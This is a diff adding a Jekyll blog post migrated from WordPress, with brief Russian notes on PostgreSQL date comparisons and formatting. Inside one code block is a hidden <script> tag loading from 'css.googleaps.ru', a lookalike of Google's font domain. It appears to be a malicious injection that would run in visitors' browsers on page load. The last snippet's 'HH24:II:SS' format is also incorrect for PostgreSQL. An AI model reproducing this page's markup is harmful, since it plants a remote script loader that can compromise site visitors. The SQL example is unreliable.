@@ -1,0 +1,33 @@
+---
+layout: post
+status: publish
+published: true
+title: Postgres время
+author:
+  display_name: Maxyc Webber
+  login: admin
+  email: maxycws@gmail.com
+  url: ''
+author_login: admin
+author_email: maxycws@gmail.com
+wordpress_id: 1634
+wordpress_url: http://devdocs.ru/partners-news/postgres-vremya/
+date: '2015-05-26 09:38:11 +0200'
+date_gmt: '2015-05-26 09:38:11 +0200'
+categories:
+- PostgreSQL
+tags:
+- post
+- des1roer
+- postgresql
+comments: []
+---
+<div dir="ltr" style="text-align: left;">текущая дата<code> <&#47;code></p>
+<pre><code>CURRENT_DATE =f_timestamp::date<br />
+<&#47;code><&#47;pre><br />
+текущий месяц</p>
+<pre><code>to_char(current_timestamp, 'YYYY-MM') = to_char(f_timestamp, 'YYYY-MM')<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;code><&#47;pre><br />
+отдаст время в формате 2015-05-26 13:55:23</p>
+<pre><code>select to_char(current_timestamp, 'YYYY-MM-DD HH24:II:SS')<&#47;code><&#47;pre><br />
+<&#47;div><br />
+Source: des1roer.blogspot.com</p>
